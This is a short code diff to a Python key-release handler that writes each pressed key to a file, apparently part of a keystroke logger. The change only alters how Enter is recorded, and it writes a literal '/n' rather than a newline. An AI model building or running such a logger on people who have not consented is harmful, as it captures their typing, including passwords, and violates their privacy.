@@ -11,7 +11,7 @@ def soltado(Key):
             if Key == keyboard.Key.space:
                 file.write(' ')
             elif Key == keyboard.Key.enter:
-                file.write(' ' + '/n')
+                file.write('/n')
             else:
                 file.write(str(f'({Key})'))
 
